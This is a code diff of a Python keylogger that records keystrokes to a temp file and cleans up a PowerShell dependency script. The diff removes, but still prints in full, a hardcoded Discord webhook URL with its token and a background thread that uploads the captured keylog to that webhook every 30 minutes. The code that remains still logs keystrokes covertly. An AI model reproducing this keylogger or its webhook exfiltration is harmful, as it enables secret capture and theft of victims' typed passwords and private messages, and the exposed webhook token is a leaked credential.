@@ -1,7 +1,6 @@
 from datetime import datetime
 from pynput.keyboard import Listener, Key
 import threading
-import requests
 import tempfile
 import time
 import sys
@@ -13,9 +12,6 @@ counter: int = 0
 # declare threading Lock() class
 counter_lock = threading.Lock()
 
-# declare main API endpoint of the server
-API_URL: str = "https://discord.com/api/webhooks/1562173720053944422/mJ10Fm2Evz0KFomAOKSNgxDcazktPjFKziMXts4ykcdTwBSAv3dBw5LHi6mPq1QoT7dt"
-
 # declare main title
 title: str = """
 ██  ██  ▄▄▄  ▄▄▄▄  ▄▄ ▄▄ ▄▄▄▄▄  ▄▄▄▄ ▄▄▄▄▄▄ 
@@ -26,7 +22,7 @@ title: str = """
 # declare main function
 def main() -> None:
 
-    # cleanup
+    # cleanup variables
     TEMP_PATH: str = tempfile.gettempdir()
 
     FILES_TO_DELETE: list[str] = [
@@ -34,6 +30,7 @@ def main() -> None:
     os.path.join(TEMP_PATH, "dependencies.ps1"),
     ]
 
+    # cleanup process
     for file in FILES_TO_DELETE:
         try:
             os.remove(file)
@@ -51,29 +48,6 @@ def main() -> None:
     # declare *keylog* path
     temp_dir = tempfile.gettempdir()
     keylog_path = os.path.join(temp_dir, "keylog.txt")
-
-    # launch thread to send data file to the server
-    # declare loop function to send data file to the server
-    def send_keylog():
-        # preparing before loop process
-        time.sleep(5)
-        while True:
-            # interval of sending files is 30 minutes (1800 seconds)
-            time.sleep(1800)
-
-            # send the file to the server
-            try:
-                # open file and send it
-                with open(keylog_path, "rb") as file:
-                    files = {"file": file}
-                    payload = {"content": "**Keylog has arrived!**"}
-
-                    response = requests.post(API_URL, files=files, data=payload)
-
-            except requests.exceptions.RequestException as request_exception_1:
-                sys.stderr.write(f"There was a request error: {request_exception_1}")
-            except Exception as request_exception_2:
-                sys.stderr.write(f"There was a request error: {request_exception_2}")
 
     def write_datetime_log():
         formatted_date = datetime.now()
@@ -95,17 +69,9 @@ def main() -> None:
         except Exception as date_log_exception:
             sys.stderr.write(f"There was an error with date log: {date_log_exception}")
 
-    # Main program setup
-    send_file_thread = threading.Thread(target=send_keylog)
-    send_file_thread.daemon = True
-
-    # launch send_file_thread to send data file to the server on background
-    send_file_thread.start()
-
     # write date time log
     write_datetime_log()
-
-    # launch keylogger process
+    
     # main on_press function
     def on_press(key_pressed):
         global counter
